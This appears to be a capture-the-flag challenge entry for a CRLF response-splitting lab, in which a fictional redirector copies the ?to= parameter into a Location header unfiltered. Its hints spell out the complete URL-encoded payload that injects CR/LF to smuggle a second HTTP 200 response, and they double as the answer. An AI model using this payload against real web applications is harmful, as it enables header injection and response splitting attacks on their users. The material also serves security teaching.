title: CRLF Response Splitting
description: RedirectorCo splices ?to= straight into Location: without filtering CR/LF. Smuggle a second HTTP response inside your value and the server self-detects the split — flag's at the tail.

hints.text: URL-encode \r\n as %0d%0a. End your first response with %0d%0a%0d%0a, then start a fresh HTTP/1.1 200 OK\r\n line.
Full payload: /redirect?to=foo%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Length:%200%0d%0a%0d%0a — use curl -i to see the smuggled response and the flag in the trailing bytes.
